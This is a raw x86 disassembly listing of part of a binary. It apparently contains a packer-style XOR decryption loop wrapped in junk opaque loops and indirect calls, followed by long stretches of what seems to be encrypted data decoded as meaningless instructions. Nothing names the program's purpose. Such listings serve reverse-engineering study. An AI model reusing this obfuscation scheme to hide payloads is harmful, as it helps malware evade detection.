  40a6a3:	sbb    BYTE PTR [edx+0x547a046],0x49
  40a6aa:	pop    ecx
  40a6ab:	sub    BYTE PTR [ebp-0x55752815],dh
  40a6b1:	std    
  40a6b2:	(bad)  
  40a6b3:	std    
  40a6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6b5:	jbe    0x40a67c
  40a6b7:	pop    edi
  40a6b8:	leave  
  40a6b9:	mov    ecx,DWORD PTR [edx]
  40a6bb:	(bad)
  40a6be:	out    dx,al
  40a6bf:	pop    edi
  40a6c0:	ins    BYTE PTR es:[edi],dx
  40a6c1:	call   0xefa7a955
  40a6c6:	jg     0x40a69f
  40a6c8:	popf   
  40a6c9:	inc    ebp
  40a6ca:	retf   
  40a6cb:	pop    es
  40a6cc:	pop    esp
  40a6cd:	pop    ebp
  40a6ce:	inc    esp
  40a6cf:	je     0x40a6cf
  40a6d1:	xchg   ebx,eax
  40a6d2:	cmp    DWORD PTR [eax-0x36151661],0x6d
  40a6d9:	(bad)
  40a6dc:	push   edi
  40a6dd:	cmp    eax,0x895b8ad9
  40a6e2:	inc    ebp
  40a6e3:	or     bh,al
  40a6e5:	add    eax,0x42861f
  40a6ea:	sbb    al,BYTE PTR [eax]
  40a6ec:	add    BYTE PTR [eax],al
  40a6ee:	cmp    DWORD PTR ds:0x42861f,0x0
  40a6f5:	je     0x40a72f
  40a6fb:	cmp    DWORD PTR ds:0x42861f,0x24
  40a702:	jbe    0x40a72f
  40a708:	jmp    0x40a71d
  40a70d:	push   0x42862f
  40a712:	push   0x428042
  40a717:	call   DWORD PTR ds:0x4287cb
  40a71d:	mov    edx,DWORD PTR ds:0x42861f
  40a723:	dec    edx
  40a724:	mov    DWORD PTR ds:0x42861f,edx
  40a72a:	jmp    0x40a6ee
  40a72f:	mov    eax,DWORD PTR [ebp-0x24]
  40a732:	and    DWORD PTR ds:0x42866f,0x0
  40a73c:	jmp    0x40a74e
  40a741:	mov    edx,DWORD PTR ds:0x42866f
  40a747:	inc    edx
  40a748:	mov    DWORD PTR ds:0x42866f,edx
  40a74e:	cmp    DWORD PTR ds:0x42866f,0x17
  40a755:	jae    0x40a78b
  40a75b:	cmp    DWORD PTR ds:0x42866f,0x1b
  40a762:	jl     0x40a78b
  40a768:	jmp    0x40a786
  40a76d:	push   DWORD PTR [ebp-0x28]
  40a770:	push   DWORD PTR [ebp-0x18]
  40a773:	push   0x56d8
  40a778:	push   0x2d04
  40a77d:	push   DWORD PTR [ebp-0x10]
  40a780:	call   DWORD PTR ds:0x42879f
  40a786:	jmp    0x40a741
  40a78b:	mov    edx,DWORD PTR [ebp+0x8]
  40a78e:	xor    eax,ecx
  40a790:	add    eax,esi
  40a792:	cmp    edx,eax
  40a794:	mov    DWORD PTR ds:0x42860b,0x4a21
  40a79e:	jbe    0x40a816
  40a7a4:	mov    eax,DWORD PTR [ebp-0x24]
  40a7a7:	mov    DWORD PTR ds:0x428617,0x16
  40a7b1:	cmp    DWORD PTR ds:0x428617,0x0
  40a7b8:	je     0x40a809
  40a7be:	cmp    DWORD PTR ds:0x428617,0x4
  40a7c5:	ja     0x40a809
  40a7cb:	jmp    0x40a7db
  40a7d0:	push   0x5454
  40a7d5:	call   DWORD PTR ds:0x4287a3
  40a7db:	cmp    DWORD PTR ds:0x428617,0x5
  40a7e2:	jne    0x40a7f7
  40a7e8:	xor    edx,edx
  40a7ea:	add    edx,DWORD PTR ds:0x428617
  40a7f0:	dec    edx
  40a7f1:	mov    DWORD PTR ds:0x428617,edx
  40a7f7:	mov    edx,DWORD PTR ds:0x428617
  40a7fd:	dec    edx
  40a7fe:	mov    DWORD PTR ds:0x428617,edx
  40a804:	jmp    0x40a7b1
  40a809:	xor    eax,ecx
  40a80b:	add    eax,esi
  40a80d:	adc    edx,0x5d89
  40a813:	mov    DWORD PTR [ebp+0x8],eax
  40a816:	sub    edx,DWORD PTR ds:0x42867b
  40a81c:	mov    eax,DWORD PTR [ebp-0x28]
  40a81f:	mov    edx,DWORD PTR [ebp+0x8]
  40a822:	xor    eax,ecx
  40a824:	mov    DWORD PTR ds:0x428677,0x29fb
  40a82e:	add    eax,esi
  40a830:	sub    DWORD PTR ds:0x42865f,0x428667
  40a83a:	imul   eax,edx
  40a83d:	and    DWORD PTR ds:0x42866b,0x0
  40a847:	xor    edx,edx
  40a849:	xor    edx,DWORD PTR ds:0x42866b
  40a84f:	inc    edx
  40a850:	mov    DWORD PTR ds:0x42866b,edx
  40a856:	cmp    DWORD PTR ds:0x42866b,0x4
  40a85d:	jge    0x40a89f
  40a863:	jmp    0x40a876
  40a868:	push   DWORD PTR [ebp-0x1c]
  40a86b:	push   0x428034
  40a870:	call   DWORD PTR ds:0x4287a7
  40a876:	cmp    DWORD PTR ds:0x42866b,0x3
  40a87d:	jne    0x40a892
  40a883:	xor    edx,edx
  40a885:	xor    edx,DWORD PTR ds:0x42866b
  40a88b:	inc    edx
  40a88c:	mov    DWORD PTR ds:0x42866b,edx
  40a892:	cmp    DWORD PTR ds:0x42866b,0x10
  40a899:	jb     0x40a847
  40a89f:	mov    DWORD PTR [ebp+0x8],eax
  40a8a2:	mov    edx,DWORD PTR ds:0x428693
  40a8a8:	mov    edx,DWORD PTR [edx]
  40a8aa:	sbb    DWORD PTR ds:0x42861f,edx
  40a8b0:	mov    eax,DWORD PTR [ebp-0x14]
  40a8b3:	mov    edx,DWORD PTR [ebp+0x8]
  40a8b6:	xor    eax,ecx
  40a8b8:	add    eax,esi
  40a8ba:	cmp    edx,eax
  40a8bc:	je     0x40aa1e
  40a8c2:	mov    eax,DWORD PTR [ebp+0x8]
  40a8c5:	mov    DWORD PTR [ebp-0x20],eax
  40a8c8:	mov    eax,DWORD PTR [ebp-0x4]
  40a8cb:	add    eax,DWORD PTR [ebp-0x30]
  40a8ce:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  40a8d5:	mov    DWORD PTR [ebp-0x1c],edi
  40a8d8:	mov    DWORD PTR [ebp-0x34],0xf89c85b2
  40a8df:	mov    DWORD PTR [ebp-0x10],eax
  40a8e2:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  40a8e9:	mov    DWORD PTR [ebp-0xc],edi
  40a8ec:	mov    eax,DWORD PTR [ebp-0x2c]
  40a8ef:	xor    eax,ecx
  40a8f1:	add    eax,esi
  40a8f3:	jmp    0x40a9da
  40a8f8:	mov    DWORD PTR [ebp-0x38],0xf89c85bb
  40a8ff:	mov    DWORD PTR [ebp-0x3c],0xf89c858e
  40a906:	mov    eax,DWORD PTR [ebp-0xc]
  40a909:	mov    edx,DWORD PTR [ebp+0x8]
  40a90c:	xor    eax,ecx
  40a90e:	add    eax,esi
  40a910:	imul   eax,edx
  40a913:	mov    edx,DWORD PTR [ebp-0x10]
  40a916:	mov    al,BYTE PTR [eax+edx*1]
  40a919:	mov    BYTE PTR [ebp+0xf],al
  40a91c:	mov    eax,DWORD PTR [ebp-0xc]
  40a91f:	mov    edx,DWORD PTR [ebp+0x8]
  40a922:	xor    eax,ecx
  40a924:	add    eax,esi
  40a926:	imul   eax,edx
  40a929:	mov    edx,DWORD PTR [ebp-0x34]
  40a92c:	xor    edx,ecx
  40a92e:	add    eax,edx
  40a930:	mov    edx,DWORD PTR [ebp-0x10]
  40a933:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a93b:	mov    edx,DWORD PTR [ebp-0x38]
  40a93e:	xor    edx,ecx
  40a940:	lea    eax,[edx+eax*1+0x3272ec]
  40a947:	movzx  edx,BYTE PTR [ebp+0xf]
  40a94b:	xor    edx,eax
  40a94d:	mov    BYTE PTR [ebp+0xf],dl
  40a950:	mov    al,BYTE PTR [ebp+0xf]
  40a953:	mov    edx,DWORD PTR [ebp-0xc]
  40a956:	mov    ebx,DWORD PTR [ebp+0x8]
  40a959:	xor    edx,ecx
  40a95b:	add    edx,esi
  40a95d:	imul   edx,ebx
  40a960:	mov    ebx,DWORD PTR [ebp-0x10]
  40a963:	mov    BYTE PTR [edx+ebx*1],al
  40a966:	mov    eax,DWORD PTR [ebp-0xc]
  40a969:	mov    edx,DWORD PTR [ebp+0x8]
  40a96c:	xor    eax,ecx
  40a96e:	add    eax,esi
  40a970:	imul   eax,edx
  40a973:	mov    edx,DWORD PTR [ebp-0x10]
  40a976:	mov    al,BYTE PTR [eax+edx*1]
  40a979:	mov    BYTE PTR [ebp+0xf],al
  40a97c:	mov    eax,DWORD PTR [ebp-0xc]
  40a97f:	mov    edx,DWORD PTR [ebp+0x8]
  40a982:	xor    eax,ecx
  40a984:	add    eax,esi
  40a986:	imul   eax,edx
  40a989:	mov    edx,DWORD PTR [ebp-0x1c]
  40a98c:	xor    edx,ecx
  40a98e:	add    eax,edx
  40a990:	mov    edx,DWORD PTR [ebp-0x10]
  40a993:	movzx  eax,BYTE PTR [eax+edx*1+0x3272ec]
  40a99b:	mov    edx,DWORD PTR [ebp-0x3c]
  40a99e:	xor    edx,ecx
  40a9a0:	lea    eax,[edx+eax*1+0x3272ec]
  40a9a7:	movzx  edx,BYTE PTR [ebp+0xf]
  40a9ab:	xor    edx,eax
  40a9ad:	mov    BYTE PTR [ebp+0xf],dl
  40a9b0:	mov    al,BYTE PTR [ebp+0xf]
  40a9b3:	mov    edx,DWORD PTR [ebp-0xc]
  40a9b6:	mov    ebx,DWORD PTR [ebp+0x8]
  40a9b9:	xor    edx,ecx
  40a9bb:	add    edx,esi
  40a9bd:	imul   edx,ebx
  40a9c0:	mov    ebx,DWORD PTR [ebp-0x10]
  40a9c3:	mov    BYTE PTR [edx+ebx*1],al
  40a9c6:	mov    eax,DWORD PTR [ebp-0x40]
  40a9c9:	mov    edx,DWORD PTR [ebp-0x1c]
  40a9cc:	xor    eax,ecx
  40a9ce:	xor    edx,ecx
  40a9d0:	add    eax,esi
  40a9d2:	add    edx,esi
  40a9d4:	imul   eax,edx
  40a9d7:	add    eax,DWORD PTR [ebp+0x8]
  40a9da:	mov    DWORD PTR [ebp+0x8],eax
  40a9dd:	mov    eax,DWORD PTR [ebp+0x8]
  40a9e0:	mov    edx,DWORD PTR [ebp-0x20]
  40a9e3:	cmp    edx,eax
  40a9e5:	jb     0x40a8f8
  40a9eb:	mov    eax,DWORD PTR [ebp-0x1c]
  40a9ee:	mov    edx,DWORD PTR [ebp-0x20]
  40a9f1:	xor    eax,ecx
  40a9f3:	add    eax,esi
  40a9f5:	imul   eax,edx
  40a9f8:	mov    edx,DWORD PTR [ebp-0x2c]
  40a9fb:	xor    edx,ecx
  40a9fd:	add    edx,esi
  40a9ff:	or     eax,edx
  40aa01:	mov    edx,DWORD PTR [ebp-0x8]
  40aa04:	xor    edx,ecx
  40aa06:	add    eax,edx
  40aa08:	mov    edx,DWORD PTR [ebp-0x8]
  40aa0b:	xor    edx,ecx
  40aa0d:	add    eax,edx
  40aa0f:	mov    edx,DWORD PTR [ebp-0x4]
  40aa12:	lea    eax,[eax+edx*1+0x64e5d8]
  40aa19:	jmp    0x40aa2d
  40aa1e:	mov    eax,DWORD PTR [ebp-0x8]
  40aa21:	mov    edx,DWORD PTR [ebp-0x4]
  40aa24:	xor    eax,ecx
  40aa26:	lea    eax,[eax+edx*1+0x3272ec]
  40aa2d:	mov    DWORD PTR [ebp-0x4],eax
  40aa30:	mov    eax,DWORD PTR [ebp-0x8]
  40aa33:	xor    eax,ecx
  40aa35:	mov    edx,0xffcd8d14
  40aa3a:	sub    edx,eax
  40aa3c:	add    edx,DWORD PTR [ebp-0x18]
  40aa3f:	mov    eax,DWORD PTR [ebp-0x8]
  40aa42:	mov    ebx,DWORD PTR [ebp-0x4]
  40aa45:	xor    eax,ecx
  40aa47:	add    eax,esi
  40aa49:	imul   eax,ebx
  40aa4c:	cmp    eax,edx
  40aa4e:	jbe    0x4082fa
  40aa54:	pop    ebx
  40aa55:	pop    edi
  40aa56:	pop    esi
  40aa57:	leave  
  40aa58:	ret    0x8
  40aa5b:	push   ebp
  40aa5c:	mov    ebp,esp
  40aa5e:	sub    esp,0x10
  40aa61:	mov    eax,ds:0x4286a3
  40aa66:	mov    ecx,DWORD PTR ds:0x428727
  40aa6c:	sub    ecx,eax
  40aa6e:	add    eax,DWORD PTR [eax+ecx*1]
  40aa71:	mov    eax,0xf89c85b0
  40aa76:	mov    DWORD PTR [ebp-0x4],eax
  40aa79:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40aa80:	mov    edx,DWORD PTR ds:0x4286db
  40aa86:	xor    ecx,ecx
  40aa88:	or     ecx,DWORD PTR ds:0x428717
  40aa8e:	sub    ecx,edx
  40aa90:	xor    edx,DWORD PTR [edx+ecx*1]
  40aa93:	mov    ecx,DWORD PTR [ebp-0x4]
  40aa96:	or     edx,0x191e
  40aa9c:	push   esi
  40aa9d:	and    DWORD PTR ds:0x4285db,0x0
  40aaa7:	mov    edx,DWORD PTR ds:0x4285db
  40aaad:	inc    edx
  40aaae:	mov    DWORD PTR ds:0x4285db,edx
  40aab4:	cmp    DWORD PTR ds:0x4285db,0x1e
  40aabb:	jl     0x40aae5
  40aac1:	jmp    0x40aad8
  40aac6:	push   0x428028
  40aacb:	push   0x1
  40aacd:	push   0x77f2
  40aad2:	call   DWORD PTR ds:0x4287ab
  40aad8:	cmp    DWORD PTR ds:0x4285db,0x13
  40aadf:	jb     0x40aaa7
  40aae5:	mov    edx,0x75108a4
  40aaea:	sbb    esi,0x397d
  40aaf0:	xor    ecx,edx
  40aaf2:	and    DWORD PTR ds:0x42866f,0x0
  40aafc:	xor    esi,esi
  40aafe:	add    esi,DWORD PTR ds:0x42866f
  40ab04:	inc    esi
  40ab05:	mov    DWORD PTR ds:0x42866f,esi
  40ab0b:	cmp    DWORD PTR ds:0x42866f,0x21
  40ab12:	jge    0x40ceb9
  40ab18:	jmp    0x40ab28
  40ab1d:	push   0x42801b
  40ab22:	call   DWORD PTR ds:0x4287af
  40ab28:	cmp    DWORD PTR ds:0x42866f,0x1c
  40ab2f:	jb     0x40aafc
  40ab35:	jmp    0x40ceb9
  40ab3a:	jo     0x40aaf5
  40ab3c:	aam    0x1d
  40ab3e:	mov    DWORD PTR [ebx],0xd07b7bab
  40ab44:	xor    DWORD PTR [ecx],edx
  40ab46:	inc    ecx
  40ab47:	add    esi,0x7ae814d5
  40ab4d:	jp     0x40ab62
  40ab4f:	pop    edi
  40ab50:	jp     0x40abcc
  40ab52:	inc    ecx
  40ab53:	leave  
  40ab54:	scas   eax,DWORD PTR es:[edi]
  40ab55:	out    0xe9,eax
  40ab57:	into   
  40ab58:	jmp    0x6121c208
  40ab5d:	or     eax,0x3fe132b8
  40ab62:	pusha  
  40ab63:	sub    eax,0xf9bf5cd0
  40ab68:	jle    0x40ab9b
  40ab6a:	addr16 push esp
  40ab6c:	sti    
  40ab6d:	inc    esp
  40ab6e:	std    
  40ab6f:	mov    esp,0x497f128c
  40ab74:	pop    esp
  40ab75:	push   esp
  40ab76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab77:	inc    edi
  40ab78:	mov    ch,0x7e
  40ab7a:	push   ebp
  40ab7b:	je     0x40abe6
  40ab7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab7e:	add    esp,DWORD PTR [ecx]
  40ab80:	mov    bl,BYTE PTR [edi-0x74554d62]
  40ab86:	add    al,0x95
  40ab88:	into   
  40ab89:	adc    DWORD PTR [ebp+0x4c],eax
  40ab8c:	push   ebx
  40ab8d:	mov    DWORD PTR [edx+0x3d2ab66],eax
  40ab93:	cli    
  40ab94:	cmp    ah,dh
  40ab96:	sub    ah,BYTE PTR [ebp+0x2b]
  40ab99:	push   es
  40ab9a:	and    al,0x77
  40ab9c:	in     eax,dx
  40ab9d:	xor    cl,BYTE PTR [ebp-0x6f2f1aec]
  40aba3:	sbb    eax,0xb3bc2b48
  40aba8:	out    0x15,eax
  40abaa:	neg    BYTE PTR ds:0x1e60b4d2
  40abb0:	test   al,0x5d
  40abb2:	push   eax
  40abb3:	inc    eax
  40abb4:	pop    eax
  40abb5:	out    dx,eax
  40abb6:	adc    BYTE PTR [ebp-0x37],cl
  40abb9:	ret    0x3937
  40abbc:	mov    ch,0x9f
  40abbe:	add    DWORD PTR [edx+0x48d78b78],esi
  40abc4:	cs sbb ch,dl
  40abc7:	pop    ecx
  40abc8:	scas   eax,DWORD PTR es:[edi]
  40abc9:	push   es
  40abca:	mov    ebp,0xdc123aa3
  40abcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abd0:	arpl   WORD PTR [esi],bp
  40abd2:	adc    ebp,esp
  40abd4:	das    
  40abd5:	jle    0x40abbc
  40abd7:	repz in al,0xe8
  40abda:	jb     0x40ac2b
  40abdc:	lods   eax,DWORD PTR ds:[esi]
  40abdd:	dec    edi
  40abde:	xchg   edx,eax
  40abdf:	xlat   BYTE PTR ds:[ebx]
  40abe0:	pop    ds
  40abe1:	sub    DWORD PTR [eax+ebx*4+0x4f],ecx
  40abe5:	and    DWORD PTR [ebp-0x2],ecx
  40abe8:	pop    esp
  40abe9:	scas   eax,DWORD PTR es:[edi]
  40abea:	fstp   TBYTE PTR [ecx-0xd1d2583]
  40abf0:	cmp    eax,0x3ebe0e00
  40abf5:	pop    ss
  40abf6:	dec    ebp
  40abf7:	mov    DWORD PTR [eax-0x3eaf63c],esi
  40abfd:	imul   eax,esi,0xffffffe3
  40ac00:	cs push 0xc4fd81c9
  40ac06:	jge    0x40abea
  40ac08:	or     BYTE PTR ds:0xcc0c556e,ah
  40ac0e:	push   edi
  40ac0f:	jmp    DWORD PTR [eax]
  40ac11:	jmp    0x40abcf
  40ac13:	adc    al,0x70
  40ac15:	aam    0x12
  40ac17:	xor    DWORD PTR [ecx],ebx
  40ac19:	lods   al,BYTE PTR ds:[esi]
  40ac1a:	out    dx,eax
  40ac1b:	xchg   esp,eax
  40ac1c:	or     edi,DWORD PTR [edi-0x25f9d3ed]
  40ac22:	in     al,dx
  40ac23:	adc    edx,DWORD PTR [ecx-0x6b445eb5]
  40ac29:	push   ds
  40ac2a:	push   edx
  40ac2b:	adc    eax,0x6aba60a1
  40ac30:	aad    0x2e
  40ac32:	aaa    
  40ac33:	push   eax
  40ac34:	fwait
  40ac35:	mov    ecx,0xb3d08f36
  40ac3a:	daa    
  40ac3b:	ds xor ecx,ecx
  40ac3e:	stc    
  40ac3f:	ficom  WORD PTR [eax+0x2b]
  40ac42:	in     eax,dx
  40ac43:	fadd   DWORD PTR [esi]
  40ac45:	stos   DWORD PTR es:[edi],eax
  40ac46:	adc    eax,0x6989f046
  40ac4b:	sbb    cl,dh
  40ac4d:	inc    eax
  40ac4e:	and    ecx,DWORD PTR [edx+0x1475b340]
  40ac54:	ltr    WORD PTR ds:[ebx]
  40ac58:	out    dx,eax
  40ac59:	scas   al,BYTE PTR es:[edi]
  40ac5a:	sbb    edx,edx
  40ac5c:	into   
  40ac5d:	stos   DWORD PTR es:[edi],eax
  40ac5e:	idiv   DWORD PTR ds:0x8e91f75e
  40ac64:	sbb    dh,BYTE PTR ds:0xec0f39ff
  40ac6a:	cs iret 
  40ac6c:	ins    BYTE PTR es:[edi],dx
  40ac6d:	shr    BYTE PTR [eax+0x17],0x3c
  40ac71:	pushf  
  40ac72:	cmp    eax,0xcf6a8a90
  40ac77:	je     0x40acd4
  40ac79:	(bad)
  40ac7c:	mov    ds:0x560d8a4d,al
  40ac81:	(bad)  
  40ac82:	pop    edx
  40ac83:	das    
  40ac84:	loop   0x40ac8d
  40ac86:	call   0xb6bf:0x5e677fee
  40ac8d:	dec    eax
  40ac8e:	iret   
  40ac8f:	add    eax,0x483f84c3
  40ac94:	scas   al,BYTE PTR es:[edi]
  40ac95:	adc    cl,BYTE PTR [ebx-0x4ac40d4]
  40ac9b:	ss mov ss,ebp
  40ac9e:	dec    ebx
  40ac9f:	retf   
  40aca0:	and    edx,DWORD PTR [edx-0x5c]
  40aca3:	repnz inc edi
  40aca5:	mov    edx,0x8095c8d2
  40acaa:	dec    edi
  40acab:	fisub  WORD PTR [ebp-0x21]
  40acae:	mov    DWORD PTR [eax],0x97a5427
  40acb4:	aas    
  40acb5:	ficom  WORD PTR [esi+0x7f]
  40acb8:	mov    dl,0xb8
  40acba:	les    esi,FWORD PTR [ecx]
  40acbc:	pop    ss
  40acbd:	int3   
  40acbe:	mov    eax,ds:0x53250e9b
  40acc3:	sub    esi,DWORD PTR [edx]
  40acc5:	xchg   esp,esi
  40acc7:	pop    ebx
  40acc8:	fcom   st(6)
  40acca:	int    0xf6
  40accc:	cdq    
  40accd:	sub    ebx,edx
  40accf:	pop    ss
  40acd0:	(bad)  
  40acd1:	out    dx,eax
  40acd2:	ret    0x9cee
  40acd5:	in     eax,0xfd
  40acd7:	inc    ebp
  40acd8:	mov    fs,WORD PTR [edi+ebx*1-0x437a3e2b]
  40acdf:	mov    ah,BYTE PTR [edi-0xa]
  40ace2:	ror    BYTE PTR [eax*8-0x11f395f3],0x5d
  40acea:	aad    0xd8
  40acec:	push   0x9f975125
  40acf1:	push   edx
  40acf2:	pop    esi
  40acf3:	dec    ebp
  40acf4:	ret    
  40acf5:	in     eax,0x6d
  40acf7:	call   0x346b:0xba34e0d2
  40acfe:	leave  
  40acff:	xchg   ebx,eax
  40ad00:	data16 add bh,BYTE PTR [ebx+0x31]
  40ad04:	inc    ecx
  40ad05:	cmp    eax,0xb5776528
  40ad0a:	repz mov esp,0xf43ab526
  40ad10:	scas   eax,DWORD PTR es:[edi]
  40ad11:	inc    esi
  40ad12:	iret   
  40ad13:	and    dh,BYTE PTR [esi]
  40ad15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad16:	or     al,0x76
  40ad18:	es aas 
  40ad1a:	ret    
  40ad1b:	dec    ecx
  40ad1c:	mov    ah,0xf6
  40ad1e:	xor    BYTE PTR [eax+0x46e982dd],bl
  40ad24:	xchg   ebp,eax
  40ad25:	retf   
  40ad26:	fcom   DWORD PTR [edx]
  40ad28:	(bad)  
  40ad29:	fadd   QWORD PTR [esi+0x37]
  40ad2c:	cs push esp
  40ad2e:	ror    DWORD PTR [esi-0x2e80d07e],1
  40ad34:	ss push ss
  40ad36:	inc    bl
  40ad38:	mov    BYTE PTR [esp+edx*2],ch
  40ad3b:	cmp    eax,DWORD PTR [eax-0x7]
  40ad3e:	cs xchg ebx,eax
  40ad40:	cmp    DWORD PTR [edx],ebp
  40ad42:	dec    edi
  40ad43:	cld    
  40ad44:	adc    al,0x64
  40ad46:	dec    esi
  40ad47:	cmp    eax,0x10124cf9
  40ad4c:	xchg   BYTE PTR [edx],dh
  40ad4e:	mov    ch,0xaf
  40ad50:	inc    ebx
  40ad51:	dec    ebp
  40ad52:	repz cmp ch,BYTE PTR [ecx-0x22d1a306]
  40ad59:	xlat   BYTE PTR ds:[ebx]
  40ad5a:	sbb    dl,ah
  40ad5c:	les    esi,FWORD PTR [ebx]
  40ad5e:	and    ecx,edi
  40ad60:	dec    ebp
  40ad61:	xlat   BYTE PTR ds:[ebx]
  40ad62:	out    0x69,eax
  40ad64:	lds    eax,FWORD PTR [ebx]
  40ad66:	sbb    DWORD PTR [ebx],esi
  40ad68:	jmp    0x244b41d2
  40ad6d:	xchg   esi,eax
  40ad6e:	xchg   ebx,eax
  40ad6f:	jns    0x40ad0d
  40ad71:	mov    edx,0xb4ae218e
  40ad76:	and    eax,0xaa4e5c31
  40ad7b:	or     al,0x81
  40ad7d:	and    al,0x36
  40ad7f:	mov    al,0x3a
  40ad81:	sbb    eax,DWORD PTR [ebx]
  40ad83:	dec    eax
  40ad84:	inc    ecx
  40ad85:	hlt    
  40ad86:	add    al,0x9a
  40ad88:	or     DWORD PTR [esi+0x62],esp
  40ad8b:	xor    DWORD PTR [edx],esi
  40ad8d:	sbb    ebx,0xa1ae54e0
  40ad93:	xchg   ecx,eax
  40ad94:	cmp    al,0xba
  40ad96:	push   esp
  40ad97:	inc    edi
  40ad98:	aad    0x25
  40ad9a:	sub    DWORD PTR [ebx],ebx
  40ad9c:	ja     0x40adb9
  40ad9e:	pop    eax
  40ad9f:	sti    
  40ada0:	xchg   ecx,eax
  40ada1:	cmp    eax,0x37ef1d4b
  40ada6:	push   edi
  40ada7:	in     al,dx
  40ada8:	dec    esi
  40ada9:	jle    0x40ad2e
  40adab:	cs pop esi
  40adad:	cmp    esp,esp
  40adaf:	out    dx,eax
  40adb0:	dec    ebx
  40adb1:	gs and esp,ebp
  40adb4:	adc    eax,0x3d2a2402
  40adb9:	dec    ebp
  40adba:	mov    esi,0x9af32913
  40adbf:	or     eax,0x3b26e098
  40adc4:	adc    eax,0x718598f9
  40adc9:	neg    BYTE PTR [ebx+0x272ac645]
  40adcf:	jp     0x40ad9a
  40add1:	push   es
  40add2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40add3:	xlat   BYTE PTR ds:[ebx]
  40add4:	jle    0x40ad74
  40add6:	and    al,0x76
  40add8:	sbb    cl,dl
  40adda:	gs fs loope 0x40adb2
  40adde:	repz into 
  40ade0:	in     al,0x40
  40ade2:	mov    edi,0xf24037ff
  40ade7:	test   bh,dh
  40ade9:	test   BYTE PTR ds:0x6f304370,bh
  40adef:	in     al,dx
  40adf0:	loop   0x40ae09
  40adf2:	(bad)  
  40adf3:	not    bl
  40adf5:	xchg   ecx,eax
  40adf6:	test   cl,cl
  40adf8:	outs   dx,BYTE PTR ds:[esi]
  40adf9:	es popf 
  40adfb:	leave  
  40adfc:	xchg   esi,eax
  40adfd:	push   es
  40adfe:	nop
  40adff:	bsf    eax,DWORD PTR ds:0xbb4604f4
  40ae06:	inc    ecx
  40ae07:	clc    
  40ae08:	ss fdiv st,st(6)
  40ae0b:	jp     0x40ae77
  40ae0d:	pop    ebp
  40ae0e:	and    DWORD PTR [esi],ebx
  40ae10:	and    DWORD PTR [ebp+ebx*4+0x18d21b21],0x6
  40ae18:	sub    al,0xde
  40ae1a:	push   edx
  40ae1b:	clc    
  40ae1c:	pop    ebx
  40ae1d:	outs   dx,DWORD PTR ds:[esi]
  40ae1e:	xchg   ebp,eax
  40ae1f:	jp     0x40adc5
  40ae21:	xchg   ebp,eax
  40ae22:	cmp    DWORD PTR [ecx+0x6d],ebx
  40ae25:	enter  0x297b,0xa8
  40ae29:	mov    ds:0x3f1e0718,eax
  40ae2e:	adc    ch,cl
  40ae30:	xor    BYTE PTR [edx+0x47],bh
  40ae33:	gs sbb eax,0x2985a87a
  40ae39:	add    al,0xce
  40ae3b:	repnz ficomp WORD PTR [ecx+0x44]
  40ae3f:	retf   
  40ae40:	push   ecx
  40ae41:	gs shl dl,1
  40ae44:	mov    edx,0x9561d065
  40ae49:	rol    cl,1
  40ae4b:	add    al,0x92
  40ae4d:	iret   
  40ae4e:	add    eax,0xaef01e0f
  40ae53:	aaa    
  40ae54:	jecxz  0x40ae0b
  40ae56:	fsub   QWORD PTR [edi+edx*2+0x45]
  40ae5a:	scas   al,BYTE PTR es:[edi]
  40ae5b:	ja     0x40ae84
  40ae5d:	cmp    al,0x17
  40ae5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae60:	int3   
  40ae61:	pusha  
  40ae62:	imul   ebx,DWORD PTR [esi+0x2b],0xeb616f8e
  40ae69:	push   ecx
  40ae6a:	and    eax,0x45e953af
  40ae6f:	pop    ecx
  40ae70:	emms   
  40ae72:	sti    
  40ae73:	sub    al,BYTE PTR [edi+0x37]
  40ae76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae77:	cmp    BYTE PTR [edi+0x1c],bh
  40ae7a:	out    dx,eax
  40ae7b:	mov    gs,WORD PTR [edx-0x75502bfd]
  40ae81:	ins    BYTE PTR es:[edi],dx
  40ae82:	xor    al,0xae
  40ae84:	cwde   
  40ae85:	popf   
  40ae86:	lds    ebp,FWORD PTR [ebx-0x559db72]
  40ae8c:	out    dx,al
  40ae8d:	mov    DWORD PTR [esi+0x65],0x92a76a98
  40ae94:	inc    edx
  40ae95:	pusha  
  40ae96:	out    dx,al
  40ae97:	fbld   TBYTE PTR [ecx+0x41d2fd14]
  40ae9d:	jno    0x40aec9
  40ae9f:	pop    ds
  40aea0:	or     eax,ebp
  40aea2:	jp     0x40ae90
  40aea4:	sti    
  40aea5:	adc    edi,DWORD PTR [eax]
  40aea7:	jle    0x40aeec
  40aea9:	or     eax,0xd8eff62d
  40aeae:	inc    eax
  40aeaf:	mov    bl,BYTE PTR [eax-0x61fa15bb]
  40aeb5:	call   0x37e3d4b0
  40aeba:	sbb    al,0xef
  40aebc:	test   DWORD PTR [ebp-0x5e],0xf01a7e4c
  40aec3:	dec    ecx
  40aec4:	mov    edx,0x2b1d6ad9
  40aec9:	pop    esi
  40aeca:	clc    
  40aecb:	(bad)  
  40aecc:	xor    eax,0xbb024082
  40aed1:	add    edx,esp
  40aed3:	add    edx,DWORD PTR [edi-0x54]
  40aed6:	or     ecx,esi
  40aed8:	(bad)  
  40aed9:	int    0x44
  40aedb:	xor    DWORD PTR [ecx+0x6f87935],eax
  40aee1:	add    DWORD PTR [esi+0x3],0xf7fc6b12
  40aee8:	fs mov ebx,0x6f6734b4
  40aeee:	jmp    0x40aee5
  40aef0:	and    DWORD PTR [edi+0x733278bc],esi
  40aef6:	sub    al,BYTE PTR [esi]
  40aef8:	add    ah,BYTE PTR [edi-0x6be6ed13]
  40aefe:	xlat   BYTE PTR ds:[ebx]
  40aeff:	lock cwde 
  40af01:	mov    ch,0xc3
  40af03:	dec    esp
  40af04:	xchg   ecx,eax
  40af05:	and    DWORD PTR [edi],edi
  40af07:	adc    ecx,DWORD PTR [esi+0x5c78b746]
  40af0d:	repz jmp FWORD PTR [edi-0x4]
  40af11:	dec    ebx
